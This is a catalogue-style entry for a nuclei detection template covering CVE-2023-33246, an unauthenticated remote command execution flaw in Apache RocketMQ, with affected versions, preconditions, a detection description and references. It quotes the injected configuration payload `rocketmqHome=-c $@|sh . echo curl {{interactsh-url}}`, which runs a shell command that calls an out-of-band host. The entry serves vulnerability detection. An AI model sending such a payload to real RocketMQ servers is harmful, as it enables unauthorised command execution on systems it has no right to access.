---
cve_id: CVE-2023-33246
template_path: nuclei-templates/network/cves/2023/CVE-2023-33246.yaml
affected_product: RocketMQ
severity: critical
authentication: none
external_callback: true
affected_versions: 5.x <= 5.1.0, 4.x < 4.9.6
preconditions: NameServer, Broker, and Controller components exposed on the extranet without permission verification
poc_classification: rce
---

## Vulnerability
RocketMQ versions 5.1.0 and below (5.x series) and versions prior to 4.9.6 (4.x series) allow remote command execution. Exposed NameServer, Broker, and Controller components lack permission verification. Attackers can exploit the update configuration function or forge protocol messages to execute arbitrary system commands as the RocketMQ runtime user.

## PoC / Detection
Classification: rce

The template performs a TCP connection to port 10911 sending a hex-encoded payload that injects a malicious `rocketmqHome=-c $@|sh . echo curl {{interactsh-url}}` configuration update command. Detection succeeds if the server response contains 'serializeTypeCurrentRPC' and an out-of-band DNS interaction is received via interactsh.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2023-33246
- https://github.com/I5N0rth/CVE-2023-33246
- http://packetstormsecurity.com/files/173339/Apache-RocketMQ-5.1.0-Arbitrary-Code-Injection.html
- http://www.openwall.com/lists/oss-security/2023/07/12/1
- https://lists.apache.org/thread/1s8j2c8kogthtpv3060yddk03zq0pxyp
